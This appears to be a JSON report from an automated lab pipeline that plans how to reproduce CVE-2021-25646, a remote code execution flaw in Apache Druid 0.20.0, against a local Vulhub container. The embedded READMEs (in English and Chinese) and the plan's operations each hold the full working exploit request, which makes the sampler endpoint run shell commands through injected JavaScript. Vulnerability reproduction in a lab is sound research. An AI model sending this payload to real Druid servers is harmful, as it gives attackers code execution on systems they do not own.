@@ -1,0 +1,87 @@
+{
+  "id": "CVE-2021-25646",
+  "project": "lab-druid-local-004",
+  "status": "information_missing",
+  "cleanup": "not_needed",
+  "observations": [],
+  "workflow": "vulhub_sources",
+  "engine_type": "langgraph",
+  "trace": "F:\\codex-workspace\\VulnForge\\reports\\druid-local-004.trace.jsonl",
+  "research": {
+    "environment": "apache-druid/CVE-2021-25646",
+    "files": [
+      {
+        "source": "apache-druid/CVE-2021-25646/docker-compose.yml",
+        "text": "version: '2'\nservices:\n web:\n   image: vulhub/apache-druid:0.20.0\n   ports:\n    - \"8888:8888\"\n"
+      },
+      {
+        "source": "apache-druid/CVE-2021-25646/README.md",
+        "text": "# Apache Druid Embedded Javascript Remote Code Execution (CVE-2021-25646)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nApache Druid is an open source, distributed data store that is designed for ingesting high volumes of data to provide instant data visibility, ad-hoc analytics and queries with low latency and high concurrency.\n\nApache Druid includes the ability to execute user-provided JavaScript code embedded in various types of requests. This functionality is intended for use in high-trust environments, and is disabled by default. However, in Druid 0.20.0 and earlier, it is possible for an authenticated user to send a specially-crafted request that forces Druid to run user-provided JavaScript code for that request, regardless of server configuration. This can be leveraged to execute code on the target machine with the privileges of the Druid server process.\n\nReferences:\n\n- <https://blogs.juniper.net/en-us/threat-research/cve-2021-25646-apache-druid-embedded-javascript-remote-code-execution>\n- <https://mp.weixin.qq.com/s/McAoLfyf_tgFIfGTAoRCiw>\n\n## Vulnerable Environment\n\nExecute following command to start an Apache Druid server 0.20.0:\n\n```\ndocker compose up -d\n```\n\nAfter server is started, you can see the home page of Apache Druid on `http://your-ip:8888`.\n\n## Exploit\n\nSend this request to the server:\n\n```\nPOST /druid/indexer/v1/sampler HTTP/1.1\nHost: your-ip:8888\nAccept-Encoding: gzip, deflate\nAccept: */*\nAccept-Language: en-US;q=0.9,en;q=0.8\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36\nConnection: close\nCache-Control: max-age=0\nContent-Type: application/json\n\n{\n    \"type\":\"index\",\n    \"spec\":{\n        \"ioConfig\":{\n            \"type\":\"index\",\n            \"firehose\":{\n                \"type\":\"local\",\n                \"baseDir\":\"/etc\",\n                \"filter\":\"passwd\"\n            }\n        },\n        \"dataSchema\":{\n            \"dataSource\":\"test\",\n            \"parser\":{\n                \"parseSpec\":{\n                \"format\":\"javascript\",\n                \"timestampSpec\":{\n\n                },\n                \"dimensionsSpec\":{\n\n                },\n                \"function\":\"function(){var a = new java.util.Scanner(java.lang.Runtime.getRuntime().exec([\\\"sh\\\",\\\"-c\\\",\\\"id\\\"]).getInputStream()).useDelimiter(\\\"\\\\A\\\").next();return {timestamp:123123,test: a}}\",\n                \"\":{\n                    \"enabled\":\"true\"\n                }\n                }\n            }\n        }\n    },\n    \"samplerConfig\":{\n        \"numRows\":10\n    }\n}\n```\n\nYou will see the output of the `id` command:\n\n![](1.png)\n"
+      },
+      {
+        "source": "apache-druid/CVE-2021-25646/README.zh-cn.md",
+        "text": "# Apache Druid 代码执行漏洞（CVE-2021-25646）\n\nApache Druid 是一个开源的分布式数据存储。\n\nApache Druid 包括执行嵌入在各种类型请求中的用户提供的 JavaScript 代码的能力。这个功能是为了在可信环境下使用，并且默认是禁用的。然而，在 Druid 0.20.0 及以前的版本中，攻击者可以通过发送一个恶意请求使 Druid 用内置引擎执行任意 JavaScript 代码，而不管服务器配置如何，这将导致代码和命令执行漏洞。\n\n参考链接：\n\n- <https://blogs.juniper.net/en-us/threat-research/cve-2021-25646-apache-druid-embedded-javascript-remote-code-execution>\n- <https://mp.weixin.qq.com/s/McAoLfyf_tgFIfGTAoRCiw>\n\n## 漏洞环境\n\n执行如下命令启动一个 Apache Druid 0.20.0 服务器：\n\n```\ndocker compose up -d\n```\n\n服务启动后，访问 `http://your-ip:8888` 即可查看到 Apache Druid 主页。\n\n## 漏洞复现\n\n直接发送如下请求即可执行其中的 JavaScript 代码：\n\n```\nPOST /druid/indexer/v1/sampler HTTP/1.1\nHost: your-ip:8888\nAccept-Encoding: gzip, deflate\nAccept: */*\nAccept-Language: en-US;q=0.9,en;q=0.8\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36\nConnection: close\nCache-Control: max-age=0\nContent-Type: application/json\n\n{\n    \"type\":\"index\",\n    \"spec\":{\n        \"ioConfig\":{\n            \"type\":\"index\",\n            \"firehose\":{\n                \"type\":\"local\",\n                \"baseDir\":\"/etc\",\n                \"filter\":\"passwd\"\n            }\n        },\n        \"dataSchema\":{\n            \"dataSource\":\"test\",\n            \"parser\":{\n                \"parseSpec\":{\n                \"format\":\"javascript\",\n                \"timestampSpec\":{\n\n                },\n                \"dimensionsSpec\":{\n\n                },\n                \"function\":\"function(){var a = new java.util.Scanner(java.lang.Runtime.getRuntime().exec([\\\"sh\\\",\\\"-c\\\",\\\"id\\\"]).getInputStream()).useDelimiter(\\\"\\\\A\\\").next();return {timestamp:123123,test: a}}\",\n                \"\":{\n                    \"enabled\":\"true\"\n                }\n                }\n            }\n        }\n    },\n    \"samplerConfig\":{\n        \"numRows\":10\n    }\n}\n```\n\n可见，`id` 命令已被成功执行：\n\n![](1.png)\n"
+      }
+    ],
+    "assets": [
+      "1.png",
+      "README.md",
+      "README.zh-cn.md",
+      "docker-compose.yml"
+    ],
+    "synthesis": {
+      "facts": [],
+      "missing_information": []
+    },
+    "generation": "source_documents"
+  },
+  "plan": {
+    "rationale": "The supplied Compose defines service web publishing container port 8888. The README documents the Druid homepage at that port for readiness and a single POST request to /druid/indexer/v1/sampler for reproduction. No initialization or container-exec command is documented, so operations are limited to one readiness GET followed by the documented POST. Service startup is a host-side `docker compose up -d` action and is recorded as missing from the operation plan.",
+    "missing_information": [
+      "Host-side service startup via `docker compose up -d` is documented in README.md but cannot be represented as an http or exec operation; it must be performed externally before the readiness check."
+    ],
+    "operations": [
+      {
+        "id": "readiness-home",
+        "kind": "http",
+        "phase": "health",
+        "service": "web",
+        "container_port": 8888,
+        "method": "GET",
+        "path": "/",
+        "headers": {},
+        "body": null,
+        "argv": [],
+        "citation": "apache-druid/CVE-2021-25646/README.md",
+        "quote": "After server is started, you can see the home page of Apache Druid on `http://your-ip:8888`.",
+        "reason": "Check the documented Druid homepage on the local published container port before sending the reproduction request."
+      },
+      {
+        "id": "reproduce-sampler-rce",
+        "kind": "http",
+        "phase": "reproduce",
+        "service": "web",
+        "container_port": 8888,
+        "method": "POST",
+        "path": "/druid/indexer/v1/sampler",
+        "headers": {
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "*/*",
+          "Accept-Language": "en-US;q=0.9,en;q=0.8",
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36",
+          "Connection": "close",
+          "Cache-Control": "max-age=0",
+          "Content-Type": "application/json"
+        },
+        "body": "{\n    \"type\":\"index\",\n    \"spec\":{\n        \"ioConfig\":{\n            \"type\":\"index\",\n            \"firehose\":{\n                \"type\":\"local\",\n                \"baseDir\":\"/etc\",\n                \"filter\":\"passwd\"\n            }\n        },\n        \"dataSchema\":{\n            \"dataSource\":\"test\",\n            \"parser\":{\n                \"parseSpec\":{\n                \"format\":\"javascript\",\n                \"timestampSpec\":{\n\n                },\n                \"dimensionsSpec\":{\n\n                },\n                \"function\":\"function(){var a = new java.util.Scanner(java.lang.Runtime.getRuntime().exec([\\\"sh\\\",\\\"-c\\\",\\\"id\\\"]).getInputStream()).useDelimiter(\\\"\\\\A\\\").next();return {timestamp:123123,test: a}}\",\n                \"\":{\n                    \"enabled\":\"true\"\n                }\n                }\n            }\n        }\n    },\n    \"samplerConfig\":{\n        \"numRows\":10\n    }\n}",
+        "argv": [],
+        "citation": "apache-druid/CVE-2021-25646/README.md",
+        "quote": "POST /druid/indexer/v1/sampler HTTP/1.1\nHost: your-ip:8888\nAccept-Encoding: gzip, deflate\nAccept: */*\nAccept-Language: en-US;q=0.9,en;q=0.8\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36\nConnection: close\nCache-Control: max-age=0\nContent-Type: application/json",
+        "reason": "Send the documented sampler request matching the README method, path, headers, and body. The README states this reproduces the CVE; no success is asserted here."
+      }
+    ]
+  },
+  "error": [
+    "Host-side service startup via `docker compose up -d` is documented in README.md but cannot be represented as an http or exec operation; it must be performed externally before the readiness check."
+  ]
+}
